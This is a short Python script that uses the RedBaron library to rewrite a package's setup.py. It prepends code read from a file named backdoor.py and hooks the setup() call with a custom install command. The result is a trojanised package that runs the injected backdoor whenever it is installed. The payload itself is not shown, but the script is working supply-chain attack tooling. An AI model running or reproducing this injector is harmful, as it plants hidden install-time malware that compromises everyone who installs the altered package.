import os
import sys
from redbaron import RedBaron

with open(os.path.join(sys.argv[1], "setup.py"), "r") as source_code:
    source = RedBaron(source_code.read())

with open("backdoor.py", "r") as backdoor_code:
    backdoor_string = backdoor_code.read()

backdoor = RedBaron(backdoor_string)

for block in reversed(backdoor):
    source.insert(0, block.dumps())
#print(source)
source.find('name', value='setup').parent.find('call').value.append("cmdclass={'install': install,}")
#print(source.dumps())

with open(os.path.join(sys.argv[1], "setup.py"), "w") as source_code:
    source_code.write(source.dumps())
